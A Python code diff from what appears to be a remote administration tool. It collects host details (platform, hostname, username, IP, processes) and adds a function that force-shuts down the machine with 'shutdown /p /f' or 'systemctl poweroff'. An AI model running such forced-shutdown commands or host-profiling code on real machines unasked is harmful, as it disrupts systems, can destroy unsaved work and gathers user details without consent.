@@ -1,6 +1,7 @@
 import platform
 import getpass
 import socket
+import os
 import process_administration as procadmin
 
 class Host:
@@ -31,4 +32,10 @@ def sendSystemInfo():
         info = Host(platform.platform(), socket.gethostname(), getpass.getuser(), getIP(), procadmin.sendProcesses())
     return info
 
-sendSystemInfo()
+def shutdownHost():
+    if platform.system() == "Windows":
+        os.system('shutdown /p /f')
+    else:
+        os.system('systemctl poweroff')
+
+
